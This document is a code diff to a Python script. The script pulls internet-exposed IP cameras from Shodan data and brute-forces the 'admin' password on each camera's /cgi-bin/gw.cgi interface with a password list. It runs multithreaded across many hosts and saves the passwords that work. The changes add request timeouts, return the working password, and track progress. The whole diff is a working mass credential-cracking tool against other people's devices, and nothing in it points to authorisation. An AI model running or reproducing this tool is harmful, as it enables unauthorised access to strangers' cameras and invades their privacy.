@@ -4,7 +4,7 @@ import xml.etree.ElementTree as ET
 import requests
 import numpy as np
 import os
-from multiprocessing import Pool
+from multiprocessing import Pool, Manager
 
 url_suffix = "/cgi-bin/gw.cgi"
 get_xml_str = '<juan ver="" squ="" dir="0"><rpermission usr="admin" pwd=""><config base=""/><playback ' \
@@ -15,7 +15,6 @@ file_path = "shodan_data.json"
 f = open('passwords.txt', 'r')
 passwords = np.array(f.read().splitlines())
 f.close()
-invalid_list = list()
 
 
 class MyThread(Thread):
@@ -34,8 +33,9 @@ class MyThread(Thread):
 
 class BreakError(Exception):
 
-    def __init__(self):
+    def __init__(self, result):
         super().__init__()
+        self.result = result
 
 
 def acquire_all_cameras():
@@ -48,7 +48,8 @@ def acquire_all_cameras():
         return result
 
 
-def try_out_passwords(url):
+def try_out_passwords(url_count):
+    url, count = url_count
     url = url + url_suffix
 
     def try_out_single_password(pwd):
@@ -58,7 +59,7 @@ def try_out_passwords(url):
         params = {'xml': ET.tostring(root).decode('utf-8')}
         # noinspection PyBroadException
         try:
-            res = requests.get(url=url, params=params, headers=head)
+            res = requests.get(url=url, params=params, headers=head, timeout=10)
         except Exception:
             return -1
         if res.status_code != 200:
@@ -70,12 +71,11 @@ def try_out_passwords(url):
             if res_root.find('rpermission').get('remain') == 0:
                 return None
             if res_root.find('rpermission').get('errno') == '0':
-                return True
+                return pwd
             return False
         except ET.ParseError as e:
             return None
 
-    results = [False] * len(passwords)
     num_threads = 10
     len_passwords = len(passwords)
     num_iterate = len_passwords // num_threads + 1
@@ -90,26 +90,22 @@ def try_out_passwords(url):
             for t, index in threads:
                 t.join()
                 result = t.get_result()
-                if result is None:
-                    raise BreakError
-                elif result == -1:
-                    invalid_list.append(url)
-                    raise BreakError
-                elif result is True:
-                    results[index] = True
-                    raise BreakError
+                if result is None or result == -1 or result:
+                    raise BreakError(result)
     except BreakError as e:
-        pass
-    pwd = passwords[results]
-    if len(pwd) > 0:
-        print("Tested {}: success".format(url))
-        return pwd[0]
-    else:
-        print("Tested {}: failed".format(url))
-        return None
+        count.value += 1
+        if e.result is None or e.result == -1:
+            print("Tested {}: failed {}".format(url, count.value))
+        else:
+            print("Tested {}: success {}".format(url, count.value))
+        return e.result
+    count.value += 1
+    print("Tested {}: failed {}".format(url, count))
+    return None
 
 
 if __name__ == "__main__":
+    count = Manager().Value('i', 0)
     if os.path.exists("addresses.json"):
         addresses = json.load(open("addresses.json"))
     else:
@@ -117,15 +113,13 @@ if __name__ == "__main__":
         addresses = ["http://" + camera['ip_str'] + ":" + str(camera['port']) for camera in cameras]
         with open("addresses.json", 'w+') as addr_file:
             addr_file.write(json.dumps(addresses))
+    addresses = [(address, count) for address in addresses]
     pool = Pool(6)
     actual_passwords = pool.map(try_out_passwords, addresses)
     pool.close()
     pool.join()
 
     print(actual_passwords)
-    print(invalid_list)
 
     actual_passwords = np.array(actual_passwords)
-    invalid_list = np.array(invalid_list)
     np.save("actual_passwords.npy", actual_passwords)
-    np.save("invalid_list.npy", invalid_list)
